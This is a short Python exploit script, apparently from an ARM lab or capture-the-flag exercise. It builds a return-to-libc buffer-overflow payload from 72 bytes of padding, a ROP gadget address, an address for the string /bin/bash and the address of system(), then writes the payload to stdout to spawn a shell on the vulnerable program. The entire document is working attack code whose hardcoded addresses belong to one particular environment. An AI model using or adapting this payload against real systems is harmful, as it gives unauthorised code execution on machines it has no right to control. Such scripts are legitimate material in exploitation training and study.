import struct
import subprocess
import sys
payload = b'A' * 72
payload += struct.pack("<I", 0xB6F52D5C)#rop gadget (pop)
payload += struct.pack("<I", 0xbefff8c2)#r0=addr of /bin/bash
payload += b'BBBB'
payload += struct.pack("<I", 0xb6f28bc5)#address of system
sys.stdout.buffer.write(payload)
